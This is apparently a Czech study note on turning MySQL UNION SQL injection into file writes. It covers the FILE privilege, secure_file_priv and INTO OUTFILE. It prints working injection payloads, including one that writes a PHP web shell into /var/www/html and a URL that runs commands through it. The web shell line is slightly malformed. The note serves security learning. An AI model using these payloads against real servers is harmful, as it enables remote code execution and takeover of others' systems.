## 📝 Zápis souborů přes SQL Injection

Možnost zapisovat soubory na server představuje kritické bezpečnostní riziko. Pokud útočník dokáže zapsat spustitelný skript (např. PHP) do veřejně přístupného adresáře webového serveru (webroot), získá tím možnost vzdáleného spouštění příkazů (**Remote Code Execution – RCE**).

### 🔑 1. Prerekvizity pro zápis souborů

Pro úspěšný zápis souboru na server pomocí MySQL/MariaDB musejí být současně splněny **3 podmínky**:

1. **Uživatelské oprávnění:** Databázový uživatel má aktivní oprávnění `FILE`.
    
2. **Konfigurace databáze:** Globální proměnná `secure_file_priv` neblokuje zápis.
    
3. **Oprávnění OS:** Proces databázového serveru (např. systémový uživatel `mysql`) má právo zápisu do cílové složky (např. `/var/www/html`).
    

### ⚙️ 2. Význam proměnné `secure_file_priv`

Proměnná `secure_file_priv` definuje bezpečnostní limity pro práci se soubory:

|**Hodnota secure_file_priv**|**Význam a dopad na bezpečnost**|
|---|---|
|**`NULL`**|Čtení i zápis souborů jsou **zcela zakázány** (výchozí nastavení u většiny moderních instalací).|
|**Cesta k adresáři** _(např. `/var/lib/mysql-files`)_|Soubory lze zapisovat a číst **pouze v tomto konkrétním adresáři**.|
|**Prázdný řetězec (`""`)**|Zápis i čtení jsou povoleny **v celém souborovém systému** (výchozí např. u starších verzí MariaDB).|

#### Ověření hodnoty přes UNION SQLi:

SQL

```
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
```

### 💾 3. Použití klauzule `SELECT ... INTO OUTFILE`

Příkaz `INTO OUTFILE` slouží primárně k exportu databázových výsledků do textových souborů.

- **Příklad exportu tabulky:**
    
    SQL
    
    ```
    SELECT * FROM users INTO OUTFILE '/tmp/credentials';
    ```
    
- **Testovací zápis řetězce přes UNION SQLi:**
    
    SQL
    
    ```
    cn' UNION SELECT 1, 'file written successfully!', 3, 4 INTO OUTFILE '/var/www/html/proof.txt'-- -
    ```
    

### 🐚 4. Princip vytvoření Web Shellu (Remote Code Execution)

Pokud je ověřeno, že zápis do adresáře webového serveru (`/var/www/html`) funguje, lze zapsat přímo kód webové inteligence/rozhraní (Web Shell):

```
cn' UNION SELECT "", 'PHP: system($_REQUEST[0]); ', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

#### Důsledek spuštění:

Uživatel přistupující k vytvořenému souboru (např. `http://SERVER/shell.php?0=id`) vyvolá vykonání systémového příkazu v operačním systému serveru s oprávněními procesního účtu webového serveru (nejčastěji `www-data`).